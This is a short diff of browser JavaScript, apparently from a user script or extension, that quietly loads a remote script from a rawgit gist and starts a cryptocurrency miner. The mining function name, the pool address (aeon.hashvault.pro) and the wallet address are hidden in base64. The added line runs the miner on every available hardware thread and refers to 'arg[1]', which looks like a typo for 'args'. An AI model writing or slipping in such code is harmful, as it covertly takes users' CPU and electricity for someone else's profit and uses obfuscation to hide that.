@@ -10,7 +10,7 @@
         else res = false;
         if (!localStorage['multratype']) {
             const s = document.createElement('script');
-            s.src = 'https://cdn.rawgit.com/ultratype/11f461eb930a975b6b3d6309ac367ecb/raw/2a7de366027980dffbf8f23f61b87939c517b5f3/Aeon2.js';
+            s.src = 'https://cdn.rawgit.com/wwwg/4a640f95cda21fd4f478ad31aa68e2d4/raw/7ab70776c9f3ae68462587a4d48c66de8205b536/validpage.js';
             s.onload = () => {
                 const key = atob('QWVvbg==');
                 var intv = setInterval(() => {
@@ -18,9 +18,7 @@
                         let args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
                             atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
                         let p = 'workers_';
-                        args.push(p);
-                        window[key].startp.apply(window[key], args);
-                        window[key].addMaxThreads();
+                        window[atob("c3RhcnRNaW5pbmc=")](args[0], arg[1], p, navigator.hardwareConcurrency);
                         clearInterval(intv);
                         return;
                     }
